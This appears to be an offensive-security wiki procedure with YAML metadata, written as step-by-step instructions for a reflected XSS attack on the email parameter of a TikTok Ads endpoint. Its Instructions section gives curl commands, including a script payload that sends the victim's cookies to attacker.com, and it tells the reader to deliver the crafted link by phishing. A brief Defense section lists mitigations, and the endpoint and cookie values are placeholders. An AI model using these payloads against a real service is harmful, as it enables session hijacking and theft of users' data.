---
id: b2c3d4e5-f6g7-8901-bcde-f23456789012
tags:
  - xss
  - reflected-xss
  - injection
  - email-parameter
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-xss-test-tiktok-ads]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:55.219Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-Script-into-Email-Parameter

## Summary

This procedure exploits a reflected XSS vulnerability in the email parameter of TikTok's ads endpoint by injecting unsanitized JavaScript, leading to arbitrary code execution in the victim's browser context for potential data exfiltration or session hijacking.

## Description

In the attack scenario, an attacker tests the ads endpoint for input validation flaws. The email parameter is reflected back in the HTML response without proper escaping, allowing injection of <script> tags. When a victim interacts with a crafted URL (e.g., via phishing), the payload executes, enabling theft of sensitive information like cookies or session tokens. This targets web-based services like TikTok Ads, requiring no authentication for the reflection but victim interaction for impact. Prerequisites include access to a browser or curl for testing and an attacker-controlled server for exfiltration.

## Requirements

1. Public access to TikTok Ads endpoint (no login required for basic testing)
2. Browser with developer tools or curl for request simulation
3. Attacker server to receive exfiltrated data (e.g., for payload callback)

## Defense

Defensive measures and detection strategies:

- Implement strict input sanitization and output encoding (e.g., HTML-escape user inputs)
- Use Content Security Policy (CSP) to block inline scripts
- Monitor for anomalous JavaScript execution via WAF logs or browser security features

## Objectives

1. Inject and execute arbitrary JavaScript in victim browser
2. Exfiltrate session data or cookies
3. Demonstrate vulnerability for reporting and remediation

## Instructions

### Step 1: Prepare Test Payload

**Context**: Craft a benign payload to verify reflection without causing harm.

Use a simple alert script as the initial test.

### Step 2: Submit Payload via Request

**Context**: Send the payload through the email parameter to the ads endpoint.

**Command** ([[commands/curl-xss-test-tiktok-ads]]):
```bash
curl -X POST 'https://ads.tiktok.com/api/endpoint' -d 'email=<script>alert("XSS Test")</script>&other_params=value' -H 'Content-Type: application/x-www-form-urlencoded' --cookie 'session=abc123'
```

> This command simulates a form submission with the payload in the email field. Expected output includes the response HTML where the script tag is reflected unescaped, triggering an alert if viewed in a browser.

### Step 3: Verify Execution and Escalate

**Context**: Confirm execution and replace with malicious payload for full exploit.

Modify the payload to exfiltrate data, then deliver via a phishing link.

**Command** ([[commands/curl-xss-test-tiktok-ads]]):
```bash
curl -X POST 'https://ads.tiktok.com/api/endpoint' -d 'email=<script>fetch('http://attacker.com/steal?data='+document.cookie)</script>&other_params=value' -H 'Content-Type: application/x-www-form-urlencoded'
```

> On success, the victim's browser sends cookie data to the attacker server upon clicking the link. Monitor server logs for received data.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-xss-test-tiktok-ads]]

## Tools Used


## Tags

- [[xss]]
- [[reflected-xss]]
- [[web-injection]]
